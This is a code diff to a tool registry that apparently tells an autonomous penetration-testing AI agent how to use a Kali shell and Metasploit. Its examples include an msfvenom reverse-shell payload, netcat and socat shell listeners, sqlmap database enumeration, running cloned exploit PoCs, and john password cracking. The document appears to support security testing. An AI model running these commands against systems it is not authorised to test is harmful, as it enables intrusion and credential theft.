@@ -114,14 +114,29 @@ TOOL_REGISTRY = {
             '   - Full Kali Linux shell (bash -c). All standard Kali tools are available.\n'
             '   - **Timeout:** 120 seconds. For long-running tasks, use dedicated tools instead.\n'
             '   - **USE FOR:** Downloading PoCs (git clone), payload generation (msfvenom),\n'
-            '     password cracking (john), encoding, DNS lookups, SSH, running downloaded scripts,\n'
+            '     password cracking (john), SQL injection (sqlmap), vulnerability research (searchsploit),\n'
+            '     reverse/bind shells (nc, socat, rlwrap), SMB enumeration (smbclient),\n'
+            '     encoding, DNS lookups, SSH, running downloaded scripts,\n'
             '     and any Kali tool not exposed as a dedicated MCP tool.\n'
-            '   - **DO NOT USE FOR:** Writing Python/Perl/Ruby/C exploit scripts (use execute_code),\n'
-            '     HTTP requests (execute_curl), port scanning (execute_naabu/nmap),\n'
-            '     CVE scanning (execute_nuclei), Metasploit sessions (metasploit_console)\n'
+            '   - **Available tools:**\n'
+            '     - **Shells:** netcat (nc -e), socat (encrypted/PTY shells), rlwrap (readline for nc listeners)\n'
+            '     - **Exploitation:** msfvenom (payload gen), searchsploit (exploit research), sqlmap (SQLi automation)\n'
+            '     - **Post-exploitation:** john (password cracking), smbclient (SMB file ops)\n'
+            '     - **Utilities:** jq (JSON parsing), git, wget, gcc/g++/make (compile C/C++ PoCs)\n'
+            '   - **DO NOT USE FOR (use the dedicated MCP tool instead):**\n'
+            '     - `curl` → use **execute_curl**\n'
+            '     - `nmap` → use **execute_nmap**\n'
+            '     - `naabu` → use **execute_naabu**\n'
+            '     - `nuclei` → use **execute_nuclei**\n'
+            '     - `msfconsole` → use **metasploit_console**\n'
+            '     - Writing exploit scripts → use **execute_code**\n'
             '   - Example: "git clone https://github.com/user/CVE-PoC.git /tmp/poc && python3 /tmp/poc/exploit.py"\n'
             '   - Example: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell"\n'
-            '   - Example: "john --wordlist=/usr/share/john/password.lst /tmp/hashes.txt"'
+            '   - Example: "john --wordlist=/usr/share/john/password.lst /tmp/hashes.txt"\n'
+            '   - Example: "socat FILE:`tty`,raw,echo=0 TCP:TARGET:4444" (connect to bind shell with full TTY)\n'
+            '   - Example: "rlwrap nc -lvnp 4444" (catch reverse shell with readline)\n'
+            '   - Example: "sqlmap -u \'http://target/page?id=1\' --batch --dbs"\n'
+            '   - Example: "searchsploit apache 2.4.49"'
         ),
     },
     "execute_code": {
@@ -146,6 +161,20 @@ TOOL_REGISTRY = {
         "purpose": "Exploit execution",
         "when_to_use": "Execute exploits, manage sessions",
         "args_format": '"command": "msfconsole command to execute"',
-        "description": None,  # Uses METASPLOIT_CONSOLE_HEADER block instead
+        "description": (
+            '**metasploit_console** (Primary for exploitation)\n'
+            '   - Execute Metasploit Framework commands\n'
+            '   - Module context and sessions persist between calls\n'
+            '   - **Chain commands with `;` (semicolons)**: `set RHOSTS 1.2.3.4; set RPORT 22; set USERNAME root`\n'
+            '   - **DO NOT use `&&` or `||`** — these shell operators are NOT supported!\n'
+            '   - Metasploit state is auto-reset on first use in each session\n'
+            '   - Simple system commands (curl, wget, python3) can be run directly in msfconsole\n'
+            '   - **msfconsole Shell Limitations (CRITICAL):**\n'
+            '     - NO variable assignment: `VAR=$(command)` does NOT work\n'
+            '     - NO heredocs, NO subshell expansion `$(...)`\n'
+            '     - Complex quoting breaks — use file-based approach instead:\n'
+            '       `echo \'script\' > /opt/output/gen.py` then `python3 /opt/output/gen.py`\n'
+            '     - If a command fails due to quoting: switch to file-based approach immediately'
+        ),
     },
 }
